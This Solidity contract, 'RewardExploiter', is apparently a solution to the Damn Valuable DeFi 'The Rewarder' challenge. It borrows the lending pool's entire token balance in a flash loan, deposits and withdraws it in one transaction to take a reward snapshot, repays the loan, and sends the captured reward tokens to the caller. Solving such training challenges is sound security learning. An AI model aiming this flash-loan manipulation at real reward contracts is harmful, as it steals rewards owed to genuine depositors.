pragma solidity ^0.6.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";

contract RewardExploiter {

    DamnValuableToken DVT;
    TheRewarderPool RPool;
    RewardToken RToken;
    FlashLoanerPool FLPool;

    constructor(address _dvt,
                address _rewardPool,
                address _rToken,
                address _flPool) public {
        DVT = DamnValuableToken(_dvt);
        RPool = TheRewarderPool(_rewardPool);
        RToken = RewardToken(_rToken);
        FLPool = FlashLoanerPool(_flPool);
    }

    function receiveFlashLoan(uint256 amount) public {
        DVT.approve(address(RPool), amount);
        RPool.deposit(amount);
        RPool.withdraw(amount);
        DVT.transfer(address(FLPool), amount);
        RToken.transfer(tx.origin, RToken.balanceOf(address(this)));
    }

    function flashLoan() public {
        uint256 amount = DVT.balanceOf(address(FLPool));
        FLPool.flashLoan(amount);
    }

}
